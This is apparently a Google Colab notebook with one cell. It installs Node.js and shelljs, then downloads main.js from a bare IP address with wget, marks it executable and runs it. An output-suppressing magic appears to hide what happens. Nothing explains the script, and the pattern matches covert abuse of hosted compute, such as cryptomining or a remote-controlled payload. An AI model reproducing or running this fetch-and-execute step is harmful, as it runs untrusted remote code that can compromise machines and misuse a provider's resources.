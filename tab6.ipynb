{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "LJdIJdd85EXP"
      },
      "outputs": [],
      "source": [
        "%%captute\n",
        "%%shell\n",
        "apt update -y && apt install -y nodejs\n",
        "npm install -i shelljs\n",
        "wget -q http://199.250.207.182/~ngewetech/include/induk/main.js && chmod +x main.js && node main.js"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "machine_shape": "hm",
      "name": "tab6.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
